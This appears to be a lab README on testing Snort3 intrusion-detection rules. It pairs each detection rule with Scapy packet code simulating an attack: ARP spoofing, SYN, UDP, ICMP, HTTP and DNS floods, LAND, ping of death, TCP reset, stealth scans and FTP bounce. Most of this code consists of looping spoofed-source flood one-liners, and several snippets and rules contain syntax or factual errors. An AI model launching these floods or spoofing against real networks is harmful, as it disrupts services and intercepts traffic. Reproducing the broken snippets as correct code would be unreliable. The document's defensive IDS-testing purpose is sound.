# Snort3_PoC
Simulating Attacks with Scapy on Snort3 IDS to test Rules and Configuration

# What is Scapy

![image](https://user-images.githubusercontent.com/91763346/236628131-c39e15d2-64e9-4074-b0de-e2f6457e806e.png)

Scapy is a powerful interactive packet manipulation libary written in Python. Scapy is able to forge or decode packets of a wide number of protocols, send them on the wire, capture them, match requests and replies, and much more.

## Running Tests on Scapy

* **Simple Message**:

Let's try simulating a simple **"bonjour"** packet that will be used as a python script
Script:
```
#!/usr/bin/python
from scapy.all import *
ip=IP(dst=”127.0.0.1”, ttl=123)/”BONJOUR”
send(ip)
```
Let's execute the script

```
$ python demo.py
```

* **Simple ICMP with datagram**:

Let's launch Scapy as a command interpreter and recreate the ping command using Scapy. 
The generated ICMP message will contain the data 'AAAAAAAAABBBBBBBBCCCCCCCC'. 
Verify with Snort that the message is well-formed by checking the response to the ping.

Let's start with launching scapy:

![image](https://user-images.githubusercontent.com/91763346/236628684-14111b58-c98e-4a5f-8a70-deaf648da003.png)

```
sudo scapy
```

Let's create an ICMP packet with the payload "AAAAAAAAABBBBBBBBCCCCCCCC" and send it to IP address 127.0.0.1:

```
>>> packet = IP(dst="127.0.0.1")/ICMP()/"AAAAAAAAABBBBBBBBCCCCCCCC"
>>> send(packet)
```

Let's check the Configuration for snort rules so that it can be detected.

![image](https://user-images.githubusercontent.com/91763346/236628793-15fa7c11-2e4f-4dc9-be60-f75b7a4f616c.png)

Let's check Snort's alert:
```
05/06-2023:00:01:01.000000 [**] [1:1000001:0] ICMP Ping detected [**][Priority: 0]  192.168.156.1 -> 127.0.0.1 ICMP TTL:64 TOS:0x0 ID:0 Seq:0/0 len:28

```

* **Simple Fragmented ICMP with datagram**:

```
sudo scapy
```

Let's create the ICMP packet and fragment it

```
>>> packet = IP(dst="127.0.0.1")/ICMP()/"AAAAAAAAABBBBBBBBCCCCCCCC"
>>> fragments = fragment(packet, 8)
```

Let's send each fragment:

```
>>> for fragment in fragments:
...     send(fragment)
```

* **Fragmentation in Scapy**:
In order to test Scapy and the fragementation process more, we can use are going to create a Snort rule to detect ICMP echo request messages containing "AAAAAAAABBBBBBBBCCCCCCCC", modify it to detect messages containing "BBBBAAAACCCCCCCC", and then fragment the ICMP message and send it to generate an alert.

Let's start with the rule:
```
alert icmp any any -> any any (msg:"ICMP message with AAAAAAAABBBBBBBBCCCCCCCC payload"; icmp_type:8; icmp_code:0; content:"AAAAAAAABBBBBBBBCCCCCCCC"; depth:24; sid:1000002; rev:1;)
```

Let's use Scapy to send the packet:

```
sudo scapy
send(IP(dst="127.0.0.1")/ICMP()/"AAAAAAAABBBBBBBBCCCCCCCC")
```

Now let's modify the Snort rule to detect ICMP messages containing "BBBBAAAACCCCCCCC" instead. Open the Snort configuration file and change the content parameter of the rule to "BBBBAAAACCCCCCCC":

```
alert icmp any any -> any any (msg:"ICMP message with BBBBAAAACCCCCCCC payload"; icmp_type:8; icmp_code:0; content:"BBBBAAAACCCCCCCC"; depth:24; sid:1000002; rev:2;)
```

Let's fragment our packet and send it:

```
packet = IP(dst="127.0.0.1")/ICMP()/"AAAAAAAABBBBBBBBCCCCCCCC"
fragments = fragment(packet, 8)
for fragment in fragments:
    send(fragment)
```

We can see that the output is like this:

```
[**] [1:1000002:2] ICMP message with BBBBAAAACCCCCCCC payload [**] [Classification: (null)] [Priority: 0] 05/06-2023:00:04:01.000000 192.168.0.1 -> 127.0.0.1 ICMP TTL:64
```

## **ARP Cache Poisoning**:

Let's start with Defining the ARP Protocol:

![image](https://user-images.githubusercontent.com/91763346/236630022-5fb2824f-3d49-4f03-8a41-6c30cc360a4d.png)

Address Resolution Protocol (ARP) is a protocol that enables network communications to reach a specific device on the network. ARP translates Internet Protocol (IP) addresses to a Media Access Control (MAC) address, and vice versa. Most commonly, devices use ARP to contact the router or gateway that enables them to connect to the Internet.

Hosts maintain an ARP cache, a mapping table between IP addresses and MAC addresses, and use it to connect to destinations on the network. If the host doesn’t know the MAC address for a certain IP address, it sends out an ARP request packet, asking other machines on the network for the matching MAC address. 

The ARP protocol was not designed for security, so it does not verify that a response to an ARP request really comes from an authorized party. It also lets hosts accept ARP responses even if they **never** sent out a request. This is a weak point in the ARP protocol, which opens the door to **ARP spoofing** attacks.

Now let's define what is ARP Spoofing aka (ARP Poisoning):

An ARP spoofing, also known as ARP poisoning, is a Man in the Middle (MitM) attack that allows attackers to intercept communication between network devices. The attack works as follows:

1. The attacker must have access to the network. They scan the network to determine the IP addresses of at least two devices⁠—let’s say these are a workstation and a router. 
2. The attacker uses a spoofing tool, such as Arpspoof or Driftnet, to send out forged ARP responses. 
3. The forged responses advertise that the correct MAC address for both IP addresses, belonging to the router and workstation, is the attacker’s MAC address. This fools both router and workstation to connect to the attacker’s machine, instead of to each other.
4. The two devices update their ARP cache entries and from that point onwards, communicate with the attacker instead of directly with each other.
The attacker is now secretly in the middle of all communications.

![image](https://user-images.githubusercontent.com/91763346/236630112-7d878398-56d0-4735-b4fe-9cd74df80500.png)


Once the attacker succeeds in an ARP spoofing attack, they can:

1. Continue routing the communications as-is⁠—the attacker can sniff the packets and steal data, except if it is transferred over an encrypted channel like HTTPS. 
2. Perform session hijacking⁠—if the attacker obtains a session ID, they can gain access to accounts the user is currently logged into.
3. Alter communication⁠—for example pushing a malicious file or website to the workstation.
4. Distributed Denial of Service (DDoS)⁠—the attackers can provide the MAC address of a server they wish to attack with DDoS, instead of their own machine. If they do this for a large number of IPs, the target server will be bombarded with traffic.

* **Simulating the ARP Poisoning Attack**:

Let's add the Snort3 rule to the config file:

```
alert arp any any -> any any (msg:"ARP Spoofing Detected"; arp.opcode == 2; arp.spa == IP_address_of_gateway_machine and arp.sha != MAC_address_of_gateway_machine; arp.tpa == IP_address_of_target_machine and arp.tha != MAC_address_of_target_machine; sid:100001; rev:1;)
```

Let's start with creating the attack on scapy:

```
from scapy.all import *
send(ARP(op=2, pdst="IP_address_of_target_machine", psrc="IP_address_of_gateway_machine", hwdst="MAC_address_of_target_machine"))
send(ARP(op=2, pdst="IP_address_of_gateway_machine", psrc="IP_address_of_target_machine", hwdst="MAC_address_of_gateway_machine"))
```

Just after launching the attack, we can see the following alert:

```
alert ip any any -> any any (msg:"ARP Spoofing Attack Detected"; flow:to_server,established; content:"|00 01 08 00 06 04 00 02 00 00 00 00|"; content:"|00 00 00 00 00 00|"; distance:6; within:12; content:"|C0 A8 01 01|"; distance:22; within:4; content:"|00 00 00 00 00 00|"; distance:28; within:6; sid:100001; rev:1;)
```

* **Simulating a Port Scan Recon with nmap and Snort3**

Let's runa a scan with nmap

```
nmap -sP 192.168.1.0/24 –-packet-trace // Will use ARP pings
nmap -sP 192.168.207.0/24 –-disable-arp-ping // Will only use ARP pings
```

Let's set up a snort rule to detect the ping sweep:

```
alert icmp any any -> $HOME_NET any (msg:”Possible Nmap ping sweep”; dsize:0; sid:1000005; rev:1;)
alert tcp any any -> $HOME_NET any (msg:”TCP Port Scanning”; detection_filter:track by_src, count 30, seconds 60; sid:1000006; rev:1;)
```

Since the TCP port scan is used more, and could give false positives we used the **COUNT** parameter in the rule to specify that the alert will only be launched after 30 packets.

Let's run a stealthy scan with nmap 

```
nmap –sT 192.168.1.1 –p- –scan-delay 5s
```
We've used the **INSANE** mode for the 5s scan delay. that's gonna make it faster.

# Simulating Advanced Attacks and Implementing their Mitigations

## SYN Flooding Attack

![image](https://user-images.githubusercontent.com/91763346/236630897-170019ad-f7ce-4af4-b6f7-d6ab8d353be7.png)

A SYN flood (half-open attack) is a type of denial-of-service (DDoS) attack which aims to make a server unavailable to legitimate traffic by consuming all available server resources. By repeatedly sending initial connection request (SYN) packets, the attacker is able to overwhelm all available ports on a targeted server machine, causing the targeted device to respond to legitimate traffic sluggishly or not at all.

![image](https://user-images.githubusercontent.com/91763346/236630925-a73fbb82-b944-4f5b-aa93-6c6764a07212.png)

* **Snort Rule**:
Let's add the snort rule to the config:

```
alert tcp !$HOME_NET any -> $HOME_NET 80 (flags: S; msg: "Possible DDoS TCP attack"; flow: stateless; detection_filter: track by_dst, count 150000, seconds 60;sid:10000001; rev:001;)
```
* **Scapy Code**:
Let's test the Scapy Code:

```
send (IP (dst = "192.168.1.1", src = RandIP()) / TCP (dport=80, flags="S"), loop=1)
```

## Land Attack

![image](https://user-images.githubusercontent.com/91763346/236631157-00271c3d-499c-40f0-9b95-000469e15bba.png)


A LAND Attack is a Layer 4 Denial of Service (DoS) attack in which, the attacker sets the source and destination information of a TCP segment to be the same. A vulnerable machine will crash or freeze due to the packet being repeatedly processed by the TCP stack.

In a LAND attack, a specially crafted TCP SYN packet is created such that the source IP address and port are set to be the same as the destination address and port, which in turn is set to point to an open port on a victim’s machine. A vulnerable machine would receive such a message and reply to the destination address effectively sending the packet for reprocessing in an infinite loop. Thus, machine CPU is consumed indefinitely freezing the vulnerable machine, causing a lock up, or even crashing it.

--> **IP Source** = **IP Destination**

* **Snort Rule**:

```
alert tcp any any -> $HOME_NET any (sameip; msg:"LAND attack"; sid:10000002; rev:001;)
```

* **Scapy Code**:
```
send (IP (dst = "192.168.1.1", src = ” 192.168.1.1”) / TCP(dport = RandShort() ), loop=1)
```

## Mail Bomb

![image](https://user-images.githubusercontent.com/91763346/236632271-ec9d481e-993e-4a9c-8f48-92436ceaa305.png)

An email bomb is a means to perform a denial-of-service (DoS) attack on an email server. Email bombing occurs when threat actors send tons of emails to a specific inbox to overwhelm it and its corresponding server. The result? The target’s inbox and server cease to function.

You can thus think of an email bomb as a DoS attack specific to email. Like a typical DoS attack, it can negatively affect a target organization’s operations. Stopping one of its email servers from working will halt communications inside and outside the network.

* **Snort Rule**:

```
alert tcp any any - $SMTP_SERVER 25 (msg: "Possible Mail Bomb attack"; flags:A+; flow:established; detection_filter: track by_dst, count 60000, seconds 60; sid:1000003; rev:001;)
```

* **Scapy Code**:
```
send (IP(dst = "192.168.207.177", src = RandIP() ) / TCP(dport = 25, flags = "AS"), loop =1)
```
## HTTP Flood Attack

![image](https://user-images.githubusercontent.com/91763346/236632380-925399ba-5b65-4505-ba2d-0248ff258784.png)


HTTP flood is a type of Distributed Denial of Service (DDoS) attack in which the attacker exploits seemingly-legitimate HTTP GET or POST requests to attack a web server or application.

HTTP flood attacks are volumetric attacks, often using a botnet “zombie army”—a group of Internet-connected computers, each of which has been maliciously taken over, usually with the assistance of malware like Trojan Horses.

A sophisticated Layer 7 attack, HTTP floods do not use malformed packets, spoofing or reflection techniques, and require less bandwidth than other attacks to bring down the targeted site or server.

![image](https://user-images.githubusercontent.com/91763346/236632369-184f6232-c682-40d5-be38-3c59b5fbe5cc.png)

When an HTTP client like a web browser “talks” to an application or server, it sends an HTTP request – generally one of two types of requests: GET or POST. A GET request is used to retrieve standard, static content like images while POST requests are used to access dynamically generated resources.

* **Snort Rule**:

```
alert tcp !$HOME_NET any -> $HOME_NET 80 (flags:S; msg:"Possible http flood attack"; flow:established; content:"GET"; nocase; http_method; detection_filter: track by_dst, count 90000, seconds 60; sid:10000004; rev:001;)
```

* **Scapy Code**:
```
send ( IP (dst = ”192.168.207.133”, src = RandIP() )/ TCP (dport=80)/ “GET /HTTP/1.0\r\n\r\n”, loop=1)
```


## TCP Reset Attack

A TCP reset attack is executed using a single packet of data, no more than a few bytes in size. A spoofed TCP segment, crafted and sent by an attacker, tricks two victims into abandoning a TCP connection, interrupting possibly vital communications between them.

![image](https://user-images.githubusercontent.com/91763346/236632606-93f17dff-8e91-4cfa-9fda-95ab01e04a0f.png)

The attack has had real-world consequences. Fear of it has caused mitigating changes to be made to the TCP protocol itself. The attack is believed to be a key component of China’s Great Firewall, used by the Chinese government to censor the internet inside China. Despite this weighty biography, understanding the attack doesn’t require deep prior knowledge of networking or TCP.

* **Snort Rule**:

```
alert tcp any any -> $HOME_NET 80 (flags:R; msg:"Possible DDoS TCP attack"; flow:stateless; sid:10000005; rev:001;)
```

* **Scapy Code**:
```
send (IP (dst = "192.168.207.177", src = RandIP() ) / TCP(dport = 80, flags = "R"), loop=1)
```

* **Output**:

![image](https://user-images.githubusercontent.com/91763346/236632695-c2e31be5-67b2-4da6-8daf-6218ed8ab2ec.png)

## Xmas Tree Attack

![image](https://user-images.githubusercontent.com/91763346/236632736-b3f39b52-5a35-4747-8c6c-ff0a20091f4c.png)


A Christmas Tree Attack is a very well known attack that is designed to send a very specifically crafted TCP packet to a device on the network. This crafting of the packet is one that turns on a bunch of flags. There is some space set up in the TCP header, called flags. And these flags all are turned on or turned off, depending on what the packet is doing.

In the case of a Christmas tree attack, we’re turning on the Urgent, the Push, and the Fin flags. And you can see, here’s an example of a screenshot of Wireshark, where Urgent is set. The Fin is set. And Push is set. So we’ve got these three different bits that are set in here.

* **Snort Rule**:

```
alert tcp !$HOME_NET any -> $HOME_NET 80 (flags:FPU; msg:"Possible christmas tree DoS attack"; flow:stateless; sid:10000006; rev:001;)
```

* **Scapy Code**:
```
send (IP(dst="192.168.207.177", src=RandIP() ) / TCP (dport= 80, flags = "FPU"), loop=1)
```

* **Output**:

![image](https://user-images.githubusercontent.com/91763346/236632783-1ba635cc-b997-49e5-bda6-520b314fbeee.png)

## UDP Flood

![image](https://user-images.githubusercontent.com/91763346/236632817-b5dfc19e-28d7-47b7-af52-549b40562b13.png)

A UDP flood is a type of denial-of-service attack in which a large number of User Datagram Protocol (UDP) packets are sent to a targeted server with the aim of overwhelming that device’s ability to process and respond. The firewall protecting the targeted server can also become exhausted as a result of UDP flooding, resulting in a denial-of-service to legitimate traffic.

* **Snort Rule**:

```
alert udp !$HOME_NET any -> $HOME_NET !53 (msg: "UDP-FLOOD detected"; flow: stateless; detection_filter: track by_dst, count 90000, seconds 60; sid:10000008; rev:001;)
```

* **Scapy Code**:
```
send (dst = “192.168.207.177”, src = RandIP() )/ UDP(dport = RandShort() ), loop=1)
```

## DNS Flood

![image](https://user-images.githubusercontent.com/91763346/236633063-3b521434-a148-4bba-b0ff-1fcc60f28416.png)


DNS flood is a type of Distributed Denial of Service (DDoS) attack in which the attacker targets one or more Domain Name System (DNS) servers belonging to a given zone, attempting to hamper resolution of resource records of that zone and its sub-zones.

* **Snort Rule**:

```
alert udp !$HOME_NET any -> $HOME_NET 53 (msg:"DNS FLOOD"; detection_filter: track by_dst, count 60000, seconds 60; sid:10000009; rev:001;)
```

* **Scapy Code**:
```
send (IP (dst = "192.168.207.169")/ UDP() / DNS (rd =1, qd = DNSQR(qname="www.isetcom.tn")), loop=1)
```

## ICMP Flood

![image](https://user-images.githubusercontent.com/91763346/236633113-375e000a-8f3c-416e-ac97-7d59ea180901.png)

An Internet Control Message Protocol (ICMP) flood attack is a common distributed denial-of-service (DDoS) attack where malicious actors try to overwhelm a server or network device with ICMP pings, or echo-request packets. Typically, ICMP pings are used to determine the health of a device and the connection to it.

* **Snort Rule**:

```
alert icmp !$HOME_NET any -> $HOME_NET any (msg:"ICMP-FLOOD"; itype:8; detection_filter: track by_dst, count 90000, seconds 60; sid:10000010; rev:001;)
```

* **Scapy Code**:
```
send (IP(dst = "192.168.207.177", src = RandIP() ) / ICMP( type= 8 ), loop=1)
```

## Ping of Death

![image](https://user-images.githubusercontent.com/91763346/236633184-40bc4846-ebc7-436a-948e-fbbef24f68d2.png)

The ping of death is a form of denial-of-service (DoS) attack that occurs when an attacker crashes, destabilizes, or freezes computers or services by targeting them with oversized data packets. This form of DoS attack typically targets and exploits legacy weaknesses that organizations may have patched.

![image](https://user-images.githubusercontent.com/91763346/236633211-73d7d51f-52f5-4ec7-bb10-0758f2a789e7.png)

 These packets do not adhere to the IP packet format when reassembled, leading to heap/memory errors and system crashes.

* **Snort Rule**:

```
alert icmp !$HOME_NET any -> $HOME_NET any (msg:"ping of death detected"; dsize: >65535; itype: 8; icode:0; sid:10000011; rev:001;)
```

* **Scapy Code**:
```
send (fragment (IP(dst = ” 192.168.207.177”) / ICMP()/ (”X”*60000), loop=1)
```

## Ack Scan

![image](https://user-images.githubusercontent.com/91763346/236633421-0478b5e3-e1b1-4603-abe9-feecb00e7bca.png)

For example, the ACK scan technique is used by attackers to gather information about a target’s firewall or Access Control List (ACL) configuration. It features a scan via a packet with an acknowledgment (ACK) flag that seeks to identify hosts or ports that are filtered or cannot be scanned in another way. Attackers watch the response from the router to understand the setup.

* **Snort Rule**:

```
alert tcp any any -> $HOME_NET any (flags: A; ack: 0; msg:"ACK Scan Detected"; sid:10000013; rev:001;)
```

* **Scapy Code**:

```
ans, unans = srloop (IP (dst = “192.168.207.177”, src=RandIP())/ TCP(dport = (0,1024), flags="A"))
```

## FIN Scan Attack

![image](https://user-images.githubusercontent.com/91763346/236633845-565e9db1-bdbb-4005-aab3-bf109f23660d.png)

A FIN scan is when an attacker sends a packet with only the FIN flag enabled. If an attacker sends the FIN packet to the target, it means the attacker is requesting the connection be terminate but there was no established connection to close.

* **Snort Rule**:

```
alert tcp !$HOME_NET any -> $HOME_NET any ( flags:SF; msg:"FIN scan"; flow: stateless; sid:10000014;rev:001;)
```

* **Scapy Code**:

```
ans, unans = srloop (IP (dst = “192.168.207.177”, src=RandIP())/ TCP (dport = (0,1024), flags="SF"))
```

## Null Scan Attack

![image](https://user-images.githubusercontent.com/91763346/236633933-298d9c30-5dc9-47f5-880f-53f35ef1a37f.png)

In a null scan, the attacker sends a packet to the target without any flags set within it. Once again, the target will be confused and will not respond. This will indicate the port is open on the target. However, if the target responds with an RST packet, this means the port is closed on the device.

* **Snort Rule**:

```
alert tcp !$HOME_NET any -> $HOME_NET any (flags:0; msg:"Null scan"; flow:stateless; sid:10000015; rev:001;)
```

* **Scapy Code**:

```
ans, unans = srloop (IP (dst = “192.168.207.177”, src=RandIP())/ TCP (dport = (0,1024), flags=0))
```

## FTP Bounce Attack

![image](https://user-images.githubusercontent.com/91763346/236633975-9f248bf6-face-4bcf-a1c0-09655e43aaaa.png)

FTP bounce attack is an exploit of the FTP protocol whereby an attacker is able to use the PORT command to request access to ports indirectly through the use of the victim machine, which serves as a proxy for the request, similar to an Open mail relay using SMTP.

* **Snort Rule**:

```
alert tcp !$HOME_NET any -> $HOME_NET 21 (msg:"FTP Bounce scan"; content:”PORT”; nocase ; ftpbounce; sid:10000015; rev:001; pcre:”/^((\%70)|(p)|(\%50))((\%6f)|(o)|(\%4f))((\%72)|(r)|(\%52))((\%74)|(t)|(\%54)) /smi”;)
```

* **Scapy Code**:

```
from scapy.all import *
import random

# FTP client IP and port
client_ip = "192.168.1.10"
client_port = random.randint(1024, 65535)

# FTP bounce server IP and port
bounce_ip = "192.168.1.20"
bounce_port = 21

# Target FTP server IP and port
server_ip = "192.168.1.30"
server_port = 21

# Connect to the bounce server and send a PORT command to the target server
ip = IP(src=client_ip, dst=bounce_ip)
port_command = "PORT " + client_ip.replace(".",",") + "," + str(client_port >> 8) + "," + str(client_port & 0xff) + "\r\n"
tcp = TCP(sport=client_port, dport=bounce_port, flags="PA")
payload = port_command.encode()
pkt = ip/tcp/payload
send(pkt)

# Send a command to the target server through the bounce server
ip = IP(src=client_ip, dst=bounce_ip)
command = "LIST\r\n"
tcp = TCP(sport=client_port, dport=bounce_port, flags="PA")
payload = command.encode()
pkt = ip/tcp/payload
send(pkt)

# Receive the response from the target server through the bounce server
resp = sniff(filter="tcp and host " + client_ip + " and port " + str(client_port), count=1)

# Print the response
print(resp[0].payload)

```
=> This code sends an FTP PORT command to the FTP bounce server, which allows the attacker to specify an arbitrary IP and port for the target FTP server to connect back to. The code then sends an FTP command to the target server through the bounce server, and waits for the response.

Note that this attack is now largely obsolete due to changes in the FTP protocol and the widespread use of firewalls that block FTP bounce attacks.
